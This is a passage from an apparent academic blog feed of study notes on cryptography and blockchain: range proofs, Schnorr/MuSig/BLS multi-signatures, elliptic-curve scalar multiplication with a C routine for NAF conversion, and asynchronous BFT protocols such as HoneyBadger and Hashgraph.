        <content type="html"><![CDATA[<h4 id="Range-Proof"><a href="#Range-Proof" class="headerlink" title="Range Proof"></a>Range Proof</h4><blockquote><p>based on Sigma Protocol</p></blockquote><p><strong>[前置知识]</strong></p><p><strong>u-ary</strong> representation: $\sigma=\sum_j(\sigma_j u^j)$</p><p>based on <strong>Boneh-Boyen</strong> signature scheme:</p><p>to show $\sigma_j\in\{0,1,…,u-1\}$ without revealing its value</p><ul><li>$x$ is private key, $A_i=g^{\frac{1}{x+i}}$ (for $\forall i\in\{0,1,…,u-1\}$)</li><li>$V_j=A_{\sigma_j}^{v_j}$</li><li>$e(V_j,g^x)\overset{\text{?}}{=}e(V_j,g)^{-\sigma_j}\cdot e(g,g)^{v_j}$, <strong>($\Sigma$ protocol format)</strong></li></ul><p>Obviously, $e(g,g)^{\frac{x\cdot v_j}{x+\sigma_j}}=e(g,g)^{\frac{-\sigma_j\cdot v_j}{x+\sigma_j}}\cdot e(g,g)^{v_j}$</p><p><strong>[正式协议]</strong></p><p>Prove $\{(g,h\in\mathbb{G},u,l;\sigma,r\in\mathbb{Z}_p):C=g^\sigma h^r\and \sigma\in[0,u^l]\}$</p><ul><li><p>$\mathcal{V}\rightarrow\mathcal{P}:$ </p><p>picks random $x\in_R\mathbb{Z}_p$</p><p>sends $y=g^x$ and $A_i=g^{\frac{1}{x+i}}$ (for $\forall i\in\{0,1,…,u-1\}$)</p></li><li><p>$\mathcal{P}\rightarrow\mathcal{V}:$ </p><p>picks $v_j\in_R\mathbb{Z}_p$</p><p>sends $V_j=A_{\sigma_j}^{v_j}$ (for $\forall j\in\{0,1,…,l-1\}$)</p></li></ul><p>Turn to Prove $\{(…,v_j):C=h^r\prod_j(g^{u^j})^{\sigma_j}\and V_j=g^{\frac{v_j}{x+\sigma_j}}\}$</p><p><strong>($\Sigma$ protocol format)</strong></p><ul><li><p>$\mathcal{P}\rightarrow\mathcal{V}:$ </p><p>picks $s_j,t_j,m_j\in_R\mathbb{Z}_p$ (for $\forall j\in\{0,1,…,l-1\}$)</p><p>sends $a_j=e(V_j,g)^{-s_j}e(g,g)^{t_j}$ and $D=\prod_j(g^{u^j})^{s_j}h^{m_j}$</p></li><li><p>$\mathcal{V}\rightarrow\mathcal{P}:$ </p><p>sends a random challenge $c\in_R\mathbb{Z}_p$</p></li><li><p>$\mathcal{P}\rightarrow\mathcal{V}:$ </p><p>sends $z_{\sigma_j}=s_j-\sigma_j c$, $z_{v_j}=t_j-v_j c$, $z_r=m-rc$</p></li><li><p>$\mathcal{V}:$ </p><p>checks that</p><ul><li><p>$D\overset{\text{?}}{=}C^ch^{z_r}\prod_j(g^{u^j})^{z_{\sigma_j}}$</p></li><li><p>$a_j\overset{\text{?}}{=}e(V_j,y)^c\cdot e(V_j,g)^{-z_{\sigma_j}}\cdot e(g,g)^{z_{v_j}}$</p><p>Obviously, $e(V_j,y)^c=e(V_j,g)^c\cdot e(g,g)^{x}$</p></li></ul></li></ul><p><img src= "/img/loading.gif" data-src="/2023/03/21/Some-tricks-about-zk-1/image-20230321112444145.png" alt="image-20230321112444145" style="zoom:50%;"></p><p>任意区间的范围证明转换对于Bullet Proof也同理</p><p><strong>[参考文献]</strong></p><p>Camenisch, J., Chaabouni, R., shelat, a. (2008). Efficient Protocols for Set Membership and Range Proofs. In: Pieprzyk, J. (eds) Advances in Cryptology - ASIACRYPT 2008. ASIACRYPT 2008. Lecture Notes in Computer Science, vol 5350. Springer, Berlin, Heidelberg. <a href="https://doi.org/10.1007/978-3-540-89255-7_15" target="_blank" rel="noopener">https://doi.org/10.1007/978-3-540-89255-7_15</a></p><h4 id="Transform-bilinear-pairing-into-Sigma-Protocol-Format"><a href="#Transform-bilinear-pairing-into-Sigma-Protocol-Format" class="headerlink" title="Transform bilinear pairing into Sigma Protocol Format"></a>Transform bilinear pairing into Sigma Protocol Format</h4><p>$\Sigma=\{(w_a,w_b):e(a,b)=e(w_a,cg_2^{w_b})\}$</p><p>picks $r\in_{R}\mathbb{Z}_q$，computes $x=c^{r},y=w_ag_1^r,z=rw_b$</p><p>等价$\Sigma’=\{(z,w_b):\frac{e(y,c)}{e(a,b)}=\frac{e(g_1,xg_2^z)}{e(y,g_2)^{w_b}}\}$</p><p>假设$w_a=g_1^{w_a’},c=g_2^{c’}$，则（双线性对展开系数）有</p><p>$(w_a’+r)c’-w_a’(c’+w_b)=(c’r+rw_b)-(w_a’+r)w_b$显然成立</p><p>$\Sigma’$ is <strong>in Sigma Protocol Format</strong> (with $x,y$ public)</p><p><strong>[参考文献]</strong></p><p>Y. Yu, Y. Zhao, Y. Li, X. Du, L. Wang and M. Guizani, “Blockchain-Based Anonymous Authentication With Selective Revocation for Smart Industrial Applications,” in IEEE Transactions on Industrial Informatics, vol. 16, no. 5, pp. 3290-3300, May 2020, doi: 10.1109/TII.2019.2944678.</p><p><em>(page 5-6)</em></p>]]></content>
      
      
      <categories>
          
          <category> Postgraduate </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Note of RingCT 2.0</title>
      <link href="/2022/09/09/Note-of-RingCT-2-0/"/>
      <url>/2022/09/09/Note-of-RingCT-2-0/</url>
      
        <content type="html"><![CDATA[<div class="row">    <embed src="RingCT_2.0.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
      
      
      <categories>
          
          <category> Postgraduate </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Overview of used cryptography concepts in blockchain</title>
      <link href="/2022/09/06/Overview-of-used-cryptography-concepts-in-blockchain/"/>
      <url>/2022/09/06/Overview-of-used-cryptography-concepts-in-blockchain/</url>
      
        <content type="html"><![CDATA[<h3 id="Signature-Scheme"><a href="#Signature-Scheme" class="headerlink" title="Signature Scheme"></a>Signature Scheme</h3><ul><li><p>Multi-Signature ( &amp; aggregation )</p><p><strong>Schnorr</strong>: <a href="https://zhuanlan.zhihu.com/p/145550969" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/145550969</a></p><p><img src= "/img/loading.gif" data-src="/2022/09/06/Overview-of-used-cryptography-concepts-in-blockchain/v2-c0e159da641a597a961580a4b35df889_1440w.jpg" alt></p><p>签名聚合($\sum$)及安全性分析：<a href="https://www.defidaonews.com/article/6684336" target="_blank" rel="noopener">https://www.defidaonews.com/article/6684336</a></p><p>$s\cdot G==R+Hash(R,X,m)\cdot X$</p><p>Hash修正为公共$Hash(\sum R,\sum X,m)$，且从signing阶段即统一修正</p><ul><li><p>通信开销（n节点）：</p><p>假设每个节点均共享$R_i=k_i\cdot G$（$O(n^2)$），则仅在其中一个节点上得到聚合签名的通信总开销为$O(n^2+n)=O(n^2)$</p><p>假设只向其中一个节点$i$发送$R_j$，由其聚合后，返回公共Hash，最后计算出$s_j$由节点$i$得到最终签名，通信总开销约为$O(n+n+n)=O(n)$</p></li><li><p>密钥消除攻击：e.g. 双节点情况下，伪造公钥为$X_1-X_2$，使得仅私钥$x_1$即可完成聚合签名</p><p>Q: 类比Bitcoin的<code>P2SH</code>，该攻击的前置条件是多重签名的地址对应的公钥已经是伪造后的公钥，也就是说需要受害者的资金转入到该多签地址中，暂待解决</p></li><li><p>签名使用的$r$不随机（漏洞分析类似ECDSA）</p></li></ul><p><strong>MuSig</strong>: <a href="https://bitcoinops.org/en/topics/musig/" target="_blank" rel="noopener">https://bitcoinops.org/en/topics/musig/</a></p><p><img src= "/img/loading.gif" data-src="/2022/09/06/Overview-of-used-cryptography-concepts-in-blockchain/image-20220906093644274.png" alt></p><p><strong>BLS</strong>: <a href="https://crypto.stanford.edu/~dabo/pubs/papers/BLSmultisig.html" target="_blank" rel="noopener">https://crypto.stanford.edu/~dabo/pubs/papers/BLSmultisig.html</a></p><p>引入双线性对解决多轮通信开销问题</p><p><img src= "/img/loading.gif" data-src="/2022/09/06/Overview-of-used-cryptography-concepts-in-blockchain/image-20220906144538165.png" alt></p><p>基于BLS的门限签名：<a href="https://learnblockchain.cn/2019/08/29/bls" target="_blank" rel="noopener">https://learnblockchain.cn/2019/08/29/bls</a></p><p>VSS私钥片段分发的细节和Shamir门限方案基本一致（拉格朗日插值恢复多项式系数）</p><p>验证$e(g\cdot(a_0+b_0+…),Hash(s))==e(g,Hash(s)\cdot(a_0+b_0+…))$</p></li><li><p>Blind Signature</p></li><li><p>Ring Signature</p><p>建个新坑：<a href="https://link.springer.com/chapter/10.1007/978-3-319-66399-9_25" target="_blank" rel="noopener">https://link.springer.com/chapter/10.1007/978-3-319-66399-9_25</a></p><p>看完门罗的RingCT回来补</p></li><li><p>Threshold Signature</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Postgraduate </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Engineering Practice of Cryptosystem(2)</title>
      <link href="/2022/07/20/Engineering-Practice-of-Cryptosystem-2/"/>
      <url>/2022/07/20/Engineering-Practice-of-Cryptosystem-2/</url>
      
        <content type="html"><![CDATA[<h2 id="Assignment"><a href="#Assignment" class="headerlink" title="Assignment"></a>Assignment</h2><p>在实验室算法库（部分）的基础上实现</p><ul><li>椭圆曲线标量乘（方法选的Sliding window，但固定基点标量乘也需要用到w-NAF，就也实现了w-NAF）</li><li>上层SM2模块（数字签名+公钥加密）</li></ul><h2 id="Record"><a href="#Record" class="headerlink" title="Record"></a>Record</h2><h3 id="fp"><a href="#fp" class="headerlink" title="fp"></a>fp</h3><p>有限域模块均采用Montgomery表示，即$x\rightarrow x\cdot R\ (mod\ N)$，输出时（调用<code>fp_wt_bin</code>）再做Mont约简</p><p>本科毕设写的格密码库就基于Montgomery做了模约简，同时实现了AVX2的并行优化，但参照的是<strong>NFLlib</strong>的技术路线，不涉及多精度（Multiprecision Montgomery）</p><p>阅读<code>bn_mont_mul_low</code>函数的逻辑后，梳理如下：</p><p><img src= "/img/loading.gif" data-src="/2022/07/20/Engineering-Practice-of-Cryptosystem-2/QQ图片20220720161816.png" alt></p><h3 id="ecp"><a href="#ecp" class="headerlink" title="ecp"></a>ecp</h3><h4 id="点加-倍点"><a href="#点加-倍点" class="headerlink" title="点加/倍点"></a>点加/倍点</h4><p>椭圆曲线模块下的点加基于雅可比坐标（为了避免仿射坐标下的求逆运算；无穷远点即$Z=0$）</p><p>仿射坐标下：</p><script type="math/tex; mode=display">\left\{\begin{aligned}\lambda & =\frac{y_2-y_1}{x_2-x_1}\\x_3 & =\lambda^2-x_1-x_2\\y_3 & =\lambda(x_1-x_3)-y_1\end{aligned}\right.</script><p>转化为雅可比坐标：$(X,Y)\rightarrow(X,Y,1)$，则点加运算过程如下：</p><p><img src= "/img/loading.gif" data-src="/2022/07/20/Engineering-Practice-of-Cryptosystem-2/QQ图片20220720161550.jpg" alt></p><p>倍点的推导类似，算法库提供的接口均已实现</p><h4 id="标量乘"><a href="#标量乘" class="headerlink" title="标量乘"></a>标量乘</h4><p>翻出了大二买的《椭圆与超椭圆曲线公钥密码的理论与实现》…（吃灰</p><ul><li><p>Sliding Window</p><p><strong>Input</strong>: 椭圆曲线上的点P, 整数$k=\sum_{j=0}^{l-1}k_j2^j$</p><p><strong>Output</strong>: Q=[k]P</p><p>窗口上限=r（模数256-bit下，暂设r=5）</p><p><img src= "/img/loading.gif" data-src="/2022/07/20/Engineering-Practice-of-Cryptosystem-2/QQ图片20220720174702.jpg" alt></p><p>$k_j=1$时，可以在处理完$h_j$那段后，直接再做$t-(j-r+1)$次倍点运算，共计跳过二进制长度=r的窗口</p></li><li><p>w-NAF</p><p>设整数k为l比特长，则可将k写作SD表达式（binary signed digit representation）$\sum_{j=0}^{l}s_j2^j,\ s_j\in\{-1,0,1\}$</p><p>其中，若要求SD表达式是稀疏的（无任何两个非零值相邻），即为NAF表达式</p><p>在k的所有SD表达式中，NAF表达式的重量最小，且具备唯一性</p><p>将整数k转换为NAF表达式的实现如下（算法1）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ecp_to_wnaf</span><span class="params">(<span class="keyword">const</span> ecp_ctx* group, <span class="keyword">int8_t</span>* R, <span class="keyword">const</span> <span class="keyword">dig_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// default NAF_2(k), i.e. w = 2</span></span><br><span class="line">    <span class="keyword">int</span> N_dig = group-&gt;N-&gt;digs;</span><br><span class="line">    <span class="keyword">dig_t</span> k_copy[MAX_BN_DIGS];</span><br><span class="line">    bn_copy(k_copy, k, N_dig);</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!bn_is_zero(k_copy, N_dig)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k_copy[<span class="number">0</span>] &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (k_copy[<span class="number">0</span>] &amp; <span class="number">0x02</span>) &#123;</span><br><span class="line">                R[j++] = <span class="number">-1</span>;</span><br><span class="line">                bn_add_dig(k_copy, k_copy, <span class="number">1</span>, N_dig);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                R[j++] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            R[j++] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bn_rsh_low(k_copy, k_copy, <span class="number">1</span>, N_dig);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当<code>k_copy % 4 = 3</code>时，令<code>R[j]=-1</code>；<code>k_copy % 4 = 1</code>时，令<code>R[j]=1</code>；否则令<code>R[j]=0</code></p><p>迭代令<code>k_copy = (k_copy - R[j]) &gt;&gt; 1</code>（由于k_copy为奇时，减去R[j]使得其%4=0，因此下一次的k_copy必为偶，保证了NAF的稀疏性），最后输出的<code>R[j]</code>即为NAF表达式的$s_j$</p><p>IEEE P1363标准中还有另一种隐式转化为NAF的方法（算法2）：</p><p><img src= "/img/loading.gif" data-src="/2022/07/20/Engineering-Practice-of-Cryptosystem-2/Snipaste_2022-07-20_20-38-10.jpg" alt></p><p>对于算法2生成的NAF表达式正确性证明如下（即证明$d_j=s_j$）：</p><p><img src= "/img/loading.gif" data-src="/2022/07/20/Engineering-Practice-of-Cryptosystem-2/QQ图片20220720161824.png" alt></p><p>测试后发现基于算法2的w-NAF标量乘要略快于算法1（w=2），而且滑动窗口法也比w-NAF要略快</p></li><li><p>固定基点G</p><p>设基点G的阶有n-bit，则预计算所有的$[2]P,[2^2]P,…,[2^{n}P]$</p><p>调用标量乘时，再将k转换为NAF表示，在每个不为0的位上进行单次点加即可</p></li></ul><h3 id="sm2"><a href="#sm2" class="headerlink" title="sm2"></a>sm2</h3><p>略</p>]]></content>
      
      
      <categories>
          
          <category> Postgraduate </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Research on aBFT</title>
      <link href="/2021/12/06/Research-on-aBFT/"/>
      <url>/2021/12/06/Research-on-aBFT/</url>
      
        <content type="html"><![CDATA[<h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><blockquote><p><a href="https://medium.com/@crytpol_25852/asynchronous-byzantine-fault-tolerance-a-time-independent-future-proof-byzantine-fault-f6f1a4d1f17a" target="_blank" rel="noopener">https://medium.com/@crytpol_25852/asynchronous-byzantine-fault-tolerance-a-time-independent-future-proof-byzantine-fault-f6f1a4d1f17a</a></p><p>Nonetheless, all these protocols employ at their core a synchronous (or partially/weak synchronous) BFT consensus algorithm which makes them unsuitable for TRULY permissionless blockchain settings where “network links can be unreliable, network speeds change rapidly, and network delays may even be adversarially induced” ¹⁷. All these BFT variants might be prepared to tolerate malfunction faults due to adversarial collusion or damage in the nodes according to the classical definition of a byzantine attack but the internet has taught us that byzantine behavior can evolve beyond to what a legacy understanding of what is a byzantine attack could have predicted. For instance, Botnetsd¹⁸ and Distributed Denial of Service (DDoS) attacks can easily be used to flood with packets an important node involved heavily in consensus and thus delaying the transmission of packets said node must send/receive for the network to achieve consensus, leading to the halting of the entire network. In this scenario is evident that synchronous consensus algorithms are susceptible to time-delayed attack due to the fact that the transmission of messages needed to achieve consensus are time-bounded. Therefore, synchronous BFT consensus algorithms are not the strongest form BFT because time-assumption are made which makes provably impossible to guarantee liveness in adversarial settings where time-based attacks are constant as can certainly happen when we use the internet¹⁹.</p></blockquote><p>BFT protocols which can run in <em>asynchronous</em> networks are particularly robust against attacks that can be mounted over public networks. Such asynchronous BFT (<strong>aBFT</strong>) protocols ensure that transactions are processed without timing assumptions.</p><p><strong>异步（Asynchronous）</strong>环境下只保证消息最终能够到达，但没有对于到达时间的限制。aBFT在设计上需要保证共识系统不会丧失活性。</p><h3 id="Honey-Badger-BFT"><a href="#Honey-Badger-BFT" class="headerlink" title="Honey Badger BFT"></a>Honey Badger BFT</h3><p>核心模块→异步共同子集协议（Asynchronous Common Subset, ACS），且HB-BFT将ACS协议分割为两个子模块：</p><p>在第一阶段，每个节点使用RBC协议（Reliable Broadcast）将本地的proposal广播给其他节点；在第二阶段，每个节点都并行执行n个ABA协议（Asynchronous Binary Agreement），来共识一个<strong>位向量</strong>（用于表示哪些RBC已成功）</p><p>门限加密模块↓</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/Snipaste_2021-12-03_18-02-44.png" alt></p><h4 id="Main-Procedure"><a href="#Main-Procedure" class="headerlink" title="Main Procedure"></a>Main Procedure</h4><p>完整的Honey Badger BFT流程如下：</p><ol><li>每个节点从本地交易池（buf）中随机选取$\lfloor B/N\rfloor$个交易，作为$proposed$。并使用门限加密模块Setup后的共享公钥$PK$对$proposed$进行加密→$x$；</li><li>每个节点都并行执行$\{RBC_i\}_N,\{ABA_i\}_N$，组成ACS模块。将$x$作为各自ACS模块的输入（实际上对于节点$\mathcal{P}_j$，即作为本地$RBC_j$的输入，见Figure_4），得到系统共识“YES”后的<em>enc_proposed</em>集合；</li><li>对Step 2输出的<em>enc_proposed</em>集合进行遍历处理：广播自己的秘密份额$e_j$，并通过f+1份share message解密得到明文交易集；</li><li>排序交易集，写入区块（但官方论文中的e.g. lexicographically有点迷惑哈…区块交易可以这么定序的嘛❓）</li><li>从本地交易池中remove已确认交易；</li></ol><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/53841f31b5ed66280d2b3adc62ef9db5_5_Figure_1.png" alt="Figure_1"></p><h4 id="ACS-Asynchronous-Common-Subset"><a href="#ACS-Asynchronous-Common-Subset" class="headerlink" title="ACS (Asynchronous Common Subset)"></a>ACS (Asynchronous Common Subset)</h4><p>Ben-Or等人设计了下述协议，来达成容量至少为$N-f$的子集共识。（$N-f$为最大容错下的诚实节点数）</p><p>for party $\mathcal{P}_i$：</p><ol><li><p>本地输入，作为$RBC_i$的输入；</p></li><li><p>$RBC_j$执行成功，将$ABA_j$的输入置1；</p></li><li><p>至少<strong>$N-f$个$ABA$实例</strong>执行完成时，将其他$ABA$实例输入均置0；</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/Snipaste_2021-12-04_13-58-02.png" alt></p><p>上图为官方论文的解释，由此对登链社区<a href="https://learnblockchain.cn/article/2494#ACS--Asynchronous-Common-Subset-" target="_blank" rel="noopener">https://learnblockchain.cn/article/2494#ACS—Asynchronous-Common-Subset-</a>一文中该点相关的描述作出勘误：</p><p>若在$N-f$个$RBC$实例成功后就将其他$ABA$输入置0，将可能出现以下情况：</p><p>&emsp;&emsp;在诚实节点$\mathcal{P}_i$上，有诚实节点$\mathcal{P}_j$对应的$RBC_{j}$还未执行成功，但已有其他$N-f$个诚实节点对应的$RBC$执行成功➡$ABA_j$的输入置0；</p><p>&emsp;&emsp;假如存在若干诚实节点本地运行的$RBC_j$出现上述$\mathcal{P}_i$的情况，导致$ABA_j$的共识过程收不到$N-f$条$Aux(1)$➡$ABA_j$的输出为0（<strong>本应该为1</strong>）；</p><p>&emsp;&emsp;<strong>由于每个诚实节点本地$N-f$个$RBC$实例执行成功的顺序可能不同</strong>，因此考虑最坏情况，可能出现论文中说的”the resulting bit vector could be <strong>empty</strong>“</p><p>回到Figure_4的实现，若改为在$N-f$个$ABA$实例成功（输出1）后，再将其余未开始执行的$ABA$输入置0，则<strong>至少能保证$size(resulting\ bit\ vector)$为$N-f$</strong>。且如果不考虑最坏情况（即某个诚实节点对应的$RBC$在很多节点上直到$N-f$个$ABA$均已输出1还未执行成功），则延迟较大的情况下将出现下述情况（仍能output 1）：</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/Snipaste_2021-12-04_15-44-28.png" alt></p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/Snipaste_2021-12-04_15-56-51.png" alt></p></li><li><p>当所有$ABA$实例执行完成后，输出为1的$ABA$下标映射到最终的<em>enc_proposed</em>集合；</p></li></ol><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/53841f31b5ed66280d2b3adc62ef9db5_7_Figure_4.png" alt="Figure_4"></p><h4 id="RBC-Reliable-Broadcast"><a href="#RBC-Reliable-Broadcast" class="headerlink" title="RBC (Reliable Broadcast)"></a>RBC (Reliable Broadcast)</h4><p>RBC协议可保证将消息可靠地发送至网络中的所有节点。</p><p>Honey Badger BFT中的RBC协议设计如下：</p><ol><li><p>本地输入，基于$(N-2f,N)$纠删码进行分割，并计算N份叶节点$\{s_j\}_N$对应的Merkle Root $h$，向节点$\mathcal{P}_j$发送$VAL(h,b_j,s_j)$</p><p>其中$VAL$是消息类型名，$b_j$为Merkle Tree从根到$s_j$的对应分支，示例如下：</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/0_EBENZgjKN5XMEJ8m.png" style="zoom:33%;"></p><blockquote><p>If we would receive the block <em>L4,</em> we would only need <em>Hash 1–0</em> and <em>Hash 0</em> to verify that block <em>L4</em> is valid for the root hash.</p></blockquote></li><li><p>收到$VAL$包后广播对应$ECHO$包；</p></li><li><p>收到$ECHO$包后校验Merkle Tree的分支，不合法则丢弃；</p></li><li><p>当收集满$N-f$（i.e. $2f+1$）个合法$ECHO$包后，从任意$f+1$个恢复出完整的$N$个叶节点$\{s_j^{‘}\}$，并验证Merkle Root是否一致，若一致则广播$READY$包；</p><p><strong>Q: 为什么纠删码采用$f+1$（i.e. $N-2f$），论文中暂未找到说明</strong></p></li><li><p>对于<strong>延迟较大</strong>的节点，若在收到$N-f$个合法$ECHO$包前，先收到了$f+1$个$READY$包，则说明至少由一个诚实节点发出，将同样广播$READY$包；</p></li><li><p>等待收到$2f+1$个$READY$包，若已收到$N-2f$个合法$ECHO$包，则恢复出对应完整输入，否则继续等待足够的$ECHO$包；</p></li></ol><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/53841f31b5ed66280d2b3adc62ef9db5_6_Figure_2.png" alt="Figure_2"></p><h4 id="ABA-Asynchronous-Binary-Agreement"><a href="#ABA-Asynchronous-Binary-Agreement" class="headerlink" title="ABA (Asynchronous Binary Agreement)"></a>ABA (Asynchronous Binary Agreement)</h4><p>$ABA$协议（如图示）对<strong>单个bit</strong>作出共识（r means the round number）</p><p>HB-BFT使用的ABA协议参考自</p><blockquote><p>A. Mostefaoui, H. Moumen, and M. Raynal. Signature-free asynchronous byzantine consensus with t&lt; n/3 and o (n 2) messages. In Proceedings of the 2014 ACM symposium on Principles of distributed computing, pages 2–9. ACM, 2014.</p></blockquote><p>初始化$est_{0}$为该$ABA$实例的输入，进入下面的循环：</p><ol><li><p>广播$BVAL_{r}(est_r)$；</p><p>$BVAL$ probably means BIT_VALUE</p></li><li><p>令$bin_values_r$为空集；</p></li><li><p>当收到来自$f+1$个节点的$BVAL_r(b)$时，证明至少由一个诚实节点发出，若未发送过$BVAL_r(b)$，则广播该消息；</p></li><li><p>当收到来自$2f+1$个节点的$BVAL_r(b)$时，将$b$加入集合$bin_values_r$；</p></li><li><p>当$bin_values_r$不为空集时：</p><ul><li><p>广播$AUX_r(w)$，$w\in bin_values_r$；</p></li><li><p>等待，直到收到$n-f$(i.e. $2f+1$)条$AUX_r$消息（其中包含的值构成集合$vals$），需要满足$vals\sub bin_values_r$；</p></li></ul><p>注意(5)在监听等待时，(3)(4)仍在运行，因此$bin_values_r$可能变化（存在部分$AUX_r$消息携带的值满足$\in bin_values_r$，被加入计数）⬅ 解释了原文为何说”this condition may be triggered upon arrival of either an AUX or an BVAL”；</p><p>但(5)不会随着$bin_values_r$的变化再次广播 ⬅ 每个诚实节点只会选择一个$w$，广播$AUX_r(w)$；</p><ul><li><p>获取随机源s（见Figure_12）</p></li><li><p>若$\mid vals\mid=2$，令下一轮的$est_{r+1}=s$；</p><p>若$\mid vals\mid=1,vals=\{v\}$，令$est_{r+1}=v$，若$v=s\%2$，输出$v$，否则继续循环；</p></li></ul></li></ol><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/53841f31b5ed66280d2b3adc62ef9db5_14_Figure_11.png" alt="Figure_11"></p><p>ABA的正确性证明可以移步<a href="https://zhuanlan.zhihu.com/p/46274211" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/46274211</a></p><p>PBFT等弱同步共识算法中若无法收到相同VOTE的$2f+1$条信息（假设$f$个拜占庭节点均不发消息，而$2f+1$个诚实节点间存在不一致VOTE👈下面解释），则引入定时器timer来解决无法达成共识的问题；</p><p>这里解释一下为什么存在诚实节点分歧👉e.g. PBFT中leader本身作恶，发给一部分节点能通过校验的区块，而发给另一部分节点不能通过校验的区块</p><p>而Honey Badger BFT异步共识算法不存在timer，并引入了随机源来解决上述问题，使得共识不会停滞（失去活性）；</p><p>HB-BFT中随机源采用的方案是对Coins’ sid的(n, f+1)阈值签名（➡ f个拜占庭节点不可能得到合法签名）；</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/53841f31b5ed66280d2b3adc62ef9db5_14_Figure_12.png" alt="Figure_12"></p><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><ul><li>The Honey Badger of BFT Protocols (paper)</li><li>Signature-Free Asynchronous Byzantine Consensus with t &lt; n/3 and O(n 2 ) Messages (paper)</li><li><a href="https://learnblockchain.cn/article/2494#RBC--Reliable-Broadcast-" target="_blank" rel="noopener">https://learnblockchain.cn/article/2494#RBC—Reliable-Broadcast-</a></li></ul><h3 id="Hashgraph"><a href="#Hashgraph" class="headerlink" title="Hashgraph"></a>Hashgraph</h3><blockquote><p>Hashgraph - a data structure that records who gossiped to whom, and in what order.</p></blockquote><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/8b92a19756c541467b3e9ee656a742e3_4_Figure_1.png" alt></p><ul><li><p>Hashgraph基础数据单元为event（包含TransactionSet、Timestamp和两个父event的HashValue）</p></li><li><p>Hashgraph网络下使用gossip协议进行通信，每个节点不停随机选择其他节点sync<strong>“己方已知但对方未知”</strong>的events，receiver收到sync后则创建自己的最新event（父hash分别指向<code>self-parent</code>和sender的最新event），并同样向随机节点sync</p><p>因此实际上传输的是<em>hashgraph itself</em>，即gossip about gossip协议：</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/Snipaste_2021-12-13_15-27-51.jpg" alt></p></li><li><p>Hashgraph将event按round划分，首先引入前置概念：</p><ul><li>See: 如果event w存在到event x的通路（有向边），则称w see x</li><li>Strongly see: 如果网络节点总数为n，event w可见超过2n/3个<strong>不同</strong>节点的event（且这些event均可见event x），则称w strongly see x</li></ul><p>对于Hashgraph下的节点，每一round中其创建的第一个event被记作<strong>witness</strong>（见证人）</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/image-20211214170712208.png" alt></p><p>每一个event都存在对应的<strong>round created number</strong>：</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/8b92a19756c541467b3e9ee656a742e3_8_Figure_3.png" alt></p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/image-20211214171338852.png" alt></p><p>若event w的父event中最大round为r，则其round created number相应的为r或r+1（<strong>r+1当且仅当w能strongly see超过2n/3个不同节点下round r的witness</strong>➡成为新一轮witness）</p></li><li></li></ul><h4 id="Reference-1"><a href="#Reference-1" class="headerlink" title="Reference"></a>Reference</h4><ul><li>THE SWIRLDS HASHGRAPH CONSENSUS ALGORITHM: FAIR, FAST, BYZANTINE FAULT TOLERANCE (paper)</li></ul><h3 id="Dumbo-BFT"><a href="#Dumbo-BFT" class="headerlink" title="Dumbo BFT"></a>Dumbo BFT</h3>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Survey of Blockchain consensus algorithm</title>
      <link href="/2021/11/12/Survey-of-Blockchain-consensus-algorithm/"/>
      <url>/2021/11/12/Survey-of-Blockchain-consensus-algorithm/</url>
      
        <content type="html"><![CDATA[<h3 id="Report"><a href="#Report" class="headerlink" title="Report"></a>Report</h3><div class="row">    <embed src="Survey_of_Blockchain_consensus_algorithm.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
